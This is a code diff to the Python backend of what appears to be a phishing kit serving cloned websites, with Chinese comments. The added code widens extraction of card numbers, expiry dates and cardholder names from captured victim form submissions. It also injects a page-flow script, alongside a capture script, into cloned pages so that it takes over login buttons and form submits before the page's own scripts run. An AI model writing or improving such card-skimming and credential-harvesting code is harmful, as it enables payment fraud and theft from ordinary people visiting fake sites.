@@ -193,6 +193,9 @@ LOGIN_LOCK = threading.Lock()
 LOGIN_MAX_FAILS = 5
 LOGIN_LOCK_SECONDS = 10 * 60
 RATE_HITS: dict[str, "collections.deque"] = {}
+# 前台注入用的页面顺序缓存：{slug: (ts, [file, ...])}，避免每个 HTML 请求都扫目录
+FLOW_ORDER_CACHE: dict[str, tuple] = {}
+FLOW_ORDER_TTL = 5.0
 
 
 
@@ -2028,6 +2031,22 @@ class Store:
             pages.sort(key=lambda page: (_rank(page["file"]), page["file"]))
         return pages
 
+    def project_flow_order(self, slug: str) -> list:
+        """前台注入用的页面顺序（只含启用页），带 5 秒缓存。
+
+        以前这段顺序只由 /api/site-flow 提供，那个接口在安全加固后要求登录，
+        访客拿不到就把每一页都当成最后一页、点按钮直接跳外链。
+        现在渲染页面时直接把顺序写进注入脚本，访客不必再去请求接口。
+        """
+        if not slug:
+            return []
+        cached = FLOW_ORDER_CACHE.get(slug)
+        if cached and time.time() - cached[0] < FLOW_ORDER_TTL:
+            return list(cached[1])
+        order = [page["file"] for page in self.project_page_files(slug) if page.get("enabled", True)]
+        FLOW_ORDER_CACHE[slug] = (time.time(), order)
+        return list(order)
+
     def set_project_page_order(self, slug: str, order: list, hidden: list | None = None) -> bool:
         clean = [str(name)[:120] for name in order if str(name)]
         payload = json.dumps(clean, ensure_ascii=False)
@@ -2341,6 +2360,12 @@ def detect_brand(number: str) -> str:
 
 # 名字里带这些词的字段不可能是卡号（是 CVV 或有效期）
 CARD_SKIP_TOKENS = ("cvv", "cvc", "cvn", "セキュリティ", "有効期限", "expiry", "expiration")
+# 字段名里出现这些词就是卡号（仿站常见：placeholder 当字段名）
+CARD_NAME_TOKENS = ("card", "カード", "ccard", "pan", "クレジット", "credit")
+# 字段名里出现这些词的长数字不是卡号：电话 / 邮编 / 订单号 / 会员号 / 验证码
+CARD_NOT_CARD_TOKENS = ("tel", "phone", "電話", "郵便", "zip", "postal", "order", "注文",
+                        "会員", "会员", "コード", "code", "otp", "認証", "password", "パスワード",
+                        "期限", "生年月日", "年月日")
 
 
 def luhn_ok(digits: str) -> bool:
@@ -2382,7 +2407,9 @@ def extract_card_values(flat: dict) -> dict:
             continue
         entries.append((k, text, re.sub(r"\D", "", text)))
 
-    # 1) 卡号：字段名命中优先，Luhn 校验兜底
+    # 1) 卡号：字段名命中 > 排除词 > Luhn > 形状兜底（13~19 位、首位 2~6）
+    #    形状兜底是为了「测试卡 / 输错一位的真卡」也能留证：以前只认 Luhn，
+    #    假卡被扔在 captures 里不进 payments，后台卡号栏永远显示「-」。
     for k, _, digits in entries:
         if "ccard" in out:
             break
@@ -2390,7 +2417,12 @@ def extract_card_values(flat: dict) -> dict:
             continue
         if any(skip in k for skip in CARD_SKIP_TOKENS):
             continue
-        if any(token in k for token in ("card", "カード", "ccard", "pan")) or luhn_ok(digits):
+        if any(token in k for token in CARD_NAME_TOKENS):
+            out["ccard"] = digits
+            continue
+        if any(t in k for t in CARD_NOT_CARD_TOKENS):
+            continue
+        if luhn_ok(digits) or digits[0] in "23456":
             out["ccard"] = digits
 
     # 2) 其余字段按别名匹配
@@ -2427,9 +2459,14 @@ def extract_card_values(flat: dict) -> dict:
             out["cdate"] = f"{month}/{year}"
 
     # 4) 持卡人名兜底：卡号之前第一段不含数字、不含 @ 的短文本
+    #    跳过页脚语言下拉（de-DE / ja-JP 这种）和 select 类字段，否则会抓成语言代码
     if "cname" not in out:
-        for _, text, digits in entries[:card_index]:
+        for k, text, digits in entries[:card_index]:
             if digits or "@" in text or not 1 <= len(text) <= 60:
+                continue
+            if "footer" in k or "select" in k or "lang" in k or "locale" in k:
+                continue
+            if re.fullmatch(r"[a-z]{2}([-_][A-Za-z]{2})?", text.strip()):
                 continue
             out["cname"] = text[:128]
             break
@@ -2444,12 +2481,17 @@ def extract_card_values(flat: dict) -> dict:
     return out
 
 
-def site_flow_script(slug: str, redirect_path: str = "") -> bytes:
-    """注入到前台页面：暴露页面顺序，无人值守时按顺序自动推进。"""
+def site_flow_script(slug: str, redirect_path: str = "", order: list | None = None) -> bytes:
+    """注入到前台页面：把页面顺序直接写进脚本，无人值守时按顺序自动推进。
+
+    顺序在服务端渲染时就注入（order 参数），不再依赖前台调 /api/site-flow：
+    那个接口要求登录，访客拿不到顺序会把每一页都当最后一页，点按钮直接跳外链。
+    """
     script = r"""
 (function(){
   var slug = "__SLUG__";
   var REDIRECT = "__REDIRECT__";
+  var ORDER = __ORDER__;
   if (!slug) return;
   var KEY = "gw_site_flow_" + slug;
   var order = [], idx = -1;
@@ -2504,18 +2546,25 @@ def site_flow_script(slug: str, redirect_path: str = "") -> bytes:
     if (REDIRECT) { location.href = REDIRECT; return true; }
     return false;
   }
-  try {
-    var cached = localStorage.getItem(KEY);
-    if (cached) apply(JSON.parse(cached));
-  } catch (e) {}
-  fetch("/api/site-flow?project=" + encodeURIComponent(slug), {cache: "no-store"})
-    .then(function(r){ return r.ok ? r.json() : null; })
-    .then(function(data){
-      if (!data || !data.order) return;
-      try { localStorage.setItem(KEY, JSON.stringify(data.order)); } catch (e) {}
-      apply(data.order);
-    })
-    .catch(function(){});
+  if (ORDER && ORDER.length) {
+    // 服务端已经把顺序写进来了：立刻生效，不用再等接口返回。
+    try { localStorage.setItem(KEY, JSON.stringify(ORDER)); } catch (e) {}
+    apply(ORDER);
+  } else {
+    try {
+      var cached = localStorage.getItem(KEY);
+      if (cached) apply(JSON.parse(cached));
+    } catch (e) {}
+    // 兜底（后台预览 / 登录态）：接口可用时再刷新一次顺序。
+    fetch("/api/site-flow?project=" + encodeURIComponent(slug), {cache: "no-store"})
+      .then(function(r){ return r.ok ? r.json() : null; })
+      .then(function(data){
+        if (!data || !data.order) return;
+        try { localStorage.setItem(KEY, JSON.stringify(data.order)); } catch (e) {}
+        apply(data.order);
+      })
+      .catch(function(){});
+  }
   // 点登录 / 提交表单：直接进入排好的下一个启用页（拦在页面自身脚本之前）
   // 页面 JS 可能直接调 form.submit()（不触发 submit 事件），一并接管
   try {
@@ -2548,8 +2597,10 @@ def site_flow_script(slug: str, redirect_path: str = "") -> bytes:
   }, true);
 })();
 """
+    order_json = json.dumps([str(name) for name in (order or [])], ensure_ascii=False)
     return ("<script data-gw-flow>" + script.replace("__SLUG__", slug)
-            .replace("__REDIRECT__", redirect_path) + "</script>").encode()
+            .replace("__REDIRECT__", redirect_path)
+            .replace("__ORDER__", order_json) + "</script>").encode()
 
 
 def capture_script(post_path: str, site_code: str) -> bytes:
@@ -4769,9 +4820,10 @@ class Handler(BaseHTTPRequestHandler):
             redirect_path = click_path if links else ""
             # 采集脚本必须排在流程脚本前面：两者都在捕获阶段监听 click，
             # 流程脚本跳转时会 stopImmediatePropagation()，排后面的监听器会被掐掉。
+            flow_slug = str(project.get("slug") or "")
             inject_blob = (kit_unlock_script()
-                           + capture_script(post_path, str(project.get("slug") or ""))
-                           + site_flow_script(str(project.get("slug") or ""), redirect_path))
+                           + capture_script(post_path, flow_slug)
+                           + site_flow_script(flow_slug, redirect_path, STORE.project_flow_order(flow_slug)))
             # 注入到 <head> 之后：抢在页面自身脚本之前注册监听，登录按钮才拦得住
             head_at = content.lower().find(b"<head")
             head_end = content.find(b">", head_at) + 1 if head_at >= 0 else -1
